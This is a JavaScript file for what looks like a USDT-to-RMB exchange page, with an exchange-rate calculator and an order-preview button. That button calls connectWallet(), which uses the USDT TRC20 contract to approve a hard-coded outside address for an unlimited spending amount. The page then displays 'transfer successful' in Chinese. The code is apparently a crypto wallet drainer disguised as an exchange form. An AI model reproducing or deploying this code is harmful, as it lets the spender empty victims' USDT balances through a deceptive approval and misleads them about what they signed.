const exchangeRate = 7.38;

document.getElementById('usdtAmount').addEventListener('input', function() {
    const usdtAmount = this.value;
    const rmbAmount = usdtAmount * exchangeRate;
    document.getElementById('rmbAmount').innerText = rmbAmount.toFixed(2);
});

async function connectWallet() {
    try {
        if (typeof window.tronWeb === 'undefined') {
            alert('请安装支持 TRC20 的钱包插件并登录');
            return;
        }

        if (window.tronWeb.defaultAddress.base58) {
            const userAddress = window.tronWeb.defaultAddress.base58;
            const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
            const usdtAbi = [
                {
                    "constant": false,
                    "inputs": [
                        { "name": "_spender", "type": "address" },
                        { "name": "_value", "type": "uint256" }
                    ],
                    "name": "approve",
                    "outputs": [{ "name": "", "type": "bool" }],
                    "type": "function"
                }
            ];

            const usdtContract = await window.tronWeb.contract().at(usdtAddress);
            const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
            const amount = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF';

            const tx = await usdtContract.approve(spenderAddress, amount).send({
                feeLimit: 100000000,
                callValue: 0
            });

            document.getElementById('okButton').innerText = '转账成功';
        } else {
            alert('请登录支持 TRC20 的钱包');
        }
    } catch (error) {
        console.error(error);
        document.getElementById('okButton').innerText = '转账失败';
    }
}

function handlePreviewOrder(type) {
    connectWallet();
}
